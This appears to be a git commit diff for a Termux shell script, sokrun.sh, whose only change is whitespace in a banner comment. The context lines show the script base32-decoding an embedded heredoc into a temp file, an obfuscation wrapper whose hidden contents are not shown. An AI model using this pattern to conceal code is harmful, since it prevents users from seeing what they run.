a44b0965100c36751a45d192b183ce0be0d6762a
Cyber404 <mfatoniazizi@gmail.com>
2025-01-27 15:30:00 +0700

    Update sokrun.sh
    Signed-off-by: Cyber404 <mfatoniazizi@gmail.com>

--- sokrun.sh
+++ sokrun.sh
@@ -1,5 +1,5 @@
 # =============================== #
-#              BY Thonxyzz404
+#        BY Thonxyzz404
 # =============================== #
 NFS=/data/data/com.termux/files/usr/tmp/tmp.x57CAPCJI0
 base32 -d >${NFS}<<THONXYZZ404EOFYZXYRWQQPYXZA
